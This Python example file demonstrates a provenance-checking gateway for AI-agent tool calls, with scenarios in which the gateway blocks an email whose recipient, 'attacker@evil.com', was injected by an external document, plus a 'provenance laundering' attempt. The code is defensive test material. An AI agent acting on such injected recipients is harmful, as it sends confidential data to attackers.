"""
langchain_gateway_example.py — Integration pattern for agent tool stacks.

This example shows how to route tool calls through the Agent Hypervisor
gateway from any Python agent stack, using a LangChain-style pattern.

The pattern is framework-agnostic. In LangChain/LangGraph you would normally:

    @tool
    def send_email(to: str, subject: str, body: str) -> str:
        smtp_client.send(to=to, subject=subject, body=body)
        return "sent"

With the gateway, you route calls through the provenance firewall first:

    client = GatewayClient("http://localhost:8080")

    @gateway_tool(client, "send_email")
    def send_email(to: str, subject: str, body: str) -> dict:
        # Body never runs directly — gateway enforces policy first
        pass

The gateway returns allow / deny / ask. For LangChain agents, the tool
function should return a string that the agent can interpret:
    - allow → return the tool result
    - deny  → return an error string (agent will stop and report)
    - ask   → return the approval_id so the agent or a supervisor can
              wait for human approval before continuing

Usage:
    # Terminal 1 — start the gateway
    python scripts/run_gateway.py

    # Terminal 2 — run this example
    python examples/integrations/langchain_gateway_example.py

If no running gateway is found, this script starts one in a background
thread for demonstration purposes.
"""

from __future__ import annotations

import sys
import threading
import time
from pathlib import Path

# Allow running from repo root without installing the package
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from agent_hypervisor.gateway_client import GatewayClient, GatewayError, arg


# ---------------------------------------------------------------------------
# Gateway tool decorator — the integration pattern
# ---------------------------------------------------------------------------

def gateway_tool(client: GatewayClient, tool_name: str):
    """
    Decorator factory that wraps a function as a gateway-routed tool.

    The decorated function is replaced with one that:
      1. Calls the gateway with the provided arguments.
      2. Returns the result if allowed.
      3. Returns an error string if denied.
      4. Returns approval metadata if confirmation is needed.

    This is the drop-in pattern for LangChain/LangGraph tool definitions.

    Example:
        @gateway_tool(client, "send_email")
        def send_email(to, subject, body):
            pass  # implementation handled by the gateway adapter

    The decorated function accepts keyword arguments where each value is
    either a raw value (defaults to "system" provenance) or an ArgSpec dict.
    """
    def decorator(fn):
        def wrapper(**kwargs):
            # Auto-wrap plain values as system-provenance ArgSpecs
            arguments = {
                k: v if isinstance(v, dict) and "source" in v else arg(v, "system")
                for k, v in kwargs.items()
            }
            response = client.execute_tool(tool_name, arguments)

            if response["verdict"] == "allow":
                return response.get("result")
            elif response["verdict"] == "deny":
                return f"[BLOCKED] {response['reason']}"
            else:  # ask
                return {
                    "status": "approval_required",
                    "approval_id": response["approval_id"],
                    "reason": response["reason"],
                }

        wrapper.__name__ = tool_name
        wrapper.__doc__ = f"Gateway-routed tool: {tool_name}"
        return wrapper
    return decorator


# ---------------------------------------------------------------------------
# Scenario runner
# ---------------------------------------------------------------------------

def run_demo(client: GatewayClient) -> None:
    print("\n" + "=" * 64)
    print("  LangChain-style Gateway Integration Demo")
    print("=" * 64)

    # --- Define tools using the gateway_tool decorator ---

    @gateway_tool(client, "read_file")
    def read_file(path):
        pass

    @gateway_tool(client, "send_email")
    def send_email(to, subject, body):
        pass

    # === Scenario 1: Read file — allowed unconditionally ===
    print("\n[1] Agent reads a file (system provenance → allowed)")
    result = read_file(path=arg("README.md", "system"))
    if isinstance(result, dict) and "content" in result:
        print(f"    ✓ File read: {result['content'][:80].strip()!r}…")
    elif isinstance(result, str) and result.startswith("[BLOCKED]"):
        print(f"    ✗ Blocked: {result}")
    else:
        print(f"    Result: {result}")

    # === Scenario 2: Email to external recipient — denied ===
    print("\n[2] Agent sends email to recipient from external document (denied)")
    print("    (Simulates: agent read a document that injected an email address)")
    result = send_email(
        to=arg("attacker@evil.com", "external_document", label="malicious_report.txt"),
        subject=arg("Confidential Report", "system"),
        body=arg("Please find the report attached.", "system"),
    )
    if isinstance(result, str) and result.startswith("[BLOCKED]"):
        print(f"    ✓ Correctly blocked: {result}")
    else:
        print(f"    Unexpected result: {result}")

    # === Scenario 3: Email to trusted recipient — ask ===
    print("\n[3] Agent sends email to user-declared recipient (ask — requires approval)")
    result = send_email(
        to=arg("alice@company.com", "user_declared", role="recipient_source"),
        subject=arg("Q3 Summary Report", "system"),
        body=arg("Please review the attached summary.", "system"),
    )
    if isinstance(result, dict) and result.get("status") == "approval_required":
        approval_id = result["approval_id"]
        print(f"    ✓ Approval required. approval_id: {approval_id}")
        print(f"      Reason: {result['reason']}")

        # Simulate reviewer approving
        print("\n[3b] Reviewer approves the email send…")
        final = client.submit_approval(approval_id, approved=True, actor="alice-reviewer")
        if final["verdict"] == "allow":
            print(f"    ✓ Approved and executed. Result: {final.get('result')}")
        else:
            print(f"    Unexpected verdict after approval: {final['verdict']}")
    else:
        print(f"    Result: {result}")

    # === Scenario 4: Derived provenance chain ===
    print("\n[4] Agent constructs email where recipient is derived from external doc (denied)")
    print("    (Provenance laundering attempt: chain includes external_document)")
    result = send_email(
        # 'to' is derived from 'doc_content' which is external_document
        to=arg("alice@company.com", "derived",
               parents=["doc_content"],   # parent arg in this call
               label="extracted from report"),
        subject=arg("Report", "system"),
        body=arg("Hi!", "system"),
        doc_content=arg("document text here", "external_document", label="report.txt"),
    )
    if isinstance(result, str) and result.startswith("[BLOCKED]"):
        print(f"    ✓ Correctly blocked (derived from external_document): {result}")
    else:
        print(f"    Result: {result}")

    # === Show trace log ===
    print("\n[5] Recent gateway trace entries:")
    traces = client.get_traces(limit=5)
    for t in traces:
        prov_short = {k: v.split(":")[0] for k, v in t.get("arg_provenance", {}).items()}
        appr = f" [approval:{t['approval_id']}]" if t.get("approval_id") else ""
        print(f"    {t['tool']:12s}  verdict={t['final_verdict']:5s}  "
              f"rule={t['matched_rule']:40s}  prov={prov_short}{appr}")

    print("\n" + "=" * 64)
    print("  Demo complete.")
    print("=" * 64 + "\n")


# ---------------------------------------------------------------------------
# Self-contained runner (starts gateway in background thread if needed)
# ---------------------------------------------------------------------------

def _start_gateway_thread(config_path: str) -> None:
    """Start the gateway server in a background daemon thread."""
    import uvicorn
    from agent_hypervisor.gateway.gateway_server import create_app
    app = create_app(config_path)
    uvicorn.run(app, host="127.0.0.1", port=8081, log_level="warning")


def main() -> None:
    gateway_url = "http://127.0.0.1:8081"
    config_path = str(Path(__file__).parent.parent.parent / "gateway_config.yaml")

    # Try connecting to a running gateway first
    client = GatewayClient(gateway_url, timeout=2)
    try:
        client.status()
        print(f"Connected to existing gateway at {gateway_url}")
    except GatewayError:
        # Start our own in background
        print(f"Starting gateway in background thread ({config_path})…")
        t = threading.Thread(target=_start_gateway_thread, args=(config_path,), daemon=True)
        t.start()
        time.sleep(1.5)  # wait for uvicorn to be ready
        print(f"Gateway started at {gateway_url}")

    client = GatewayClient(gateway_url, timeout=10)
    run_demo(client)


if __name__ == "__main__":
    main()
